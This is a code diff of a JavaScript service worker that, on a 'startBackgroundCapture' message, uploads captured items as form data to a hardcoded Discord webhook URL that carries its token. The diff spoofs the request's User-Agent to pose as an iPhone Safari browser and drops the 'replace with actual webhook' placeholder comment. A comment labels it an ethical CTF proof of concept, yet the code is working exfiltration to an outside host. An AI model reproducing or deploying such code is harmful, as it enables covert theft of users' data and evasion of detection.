@@ -2,7 +2,7 @@ self.addEventListener('message', async event => {
     if (event.data.action !== 'startBackgroundCapture') return;
 
     // WARNING: Ethical CTF PoC only. Unauthorized use violates privacy laws.
-    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1375982804852146247/3B6K6PbBrS05n0DOlWLJa3ba-t4t_Qc0ZyaLjCYMrT6Op7u-cvmddGrahMke9PoUH2di'; // Replace with actual webhook URL
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1375982804852146247/3B6K6PbBrS05n0DOlWLJa3ba-t4t_Qc0ZyaLjCYMrT6Op7u-cvmddGrahMke9PoUH2di';
 
     async function sendItem(type, data, index = null) {
         try {
@@ -30,7 +30,7 @@ self.addEventListener('message', async event => {
                 method: 'POST',
                 body: formData,
                 headers: { 
-                    'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36`
+                    'User-Agent': `Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1`
                 }
             });
             if (!response.ok) throw new Error(`HTTP ${response.status}: ${response.statusText}`);
